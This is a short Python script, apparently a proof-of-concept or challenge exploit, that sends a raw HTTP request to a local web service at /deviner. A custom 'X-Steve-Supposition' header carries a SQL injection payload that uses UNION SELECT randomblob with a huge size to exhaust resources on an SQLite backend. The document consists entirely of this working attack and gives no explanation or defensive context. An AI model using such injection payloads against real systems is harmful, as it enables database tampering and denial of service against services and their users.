import socket

payload = (
    "GET /deviner HTTP/1.1\r\n"
    "Host: localhost:3000\r\n"
    "X-Steve-Supposition: ' UNION SELECT randomblob(1000000000);--\r\n"
    "X-Steve-Supposition: abc\r\n"
    "User-Agent: test\r\n"
    "\r\n"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 3000))
s.send(payload.encode())
response = s.recv(4096)
print(response.decode())
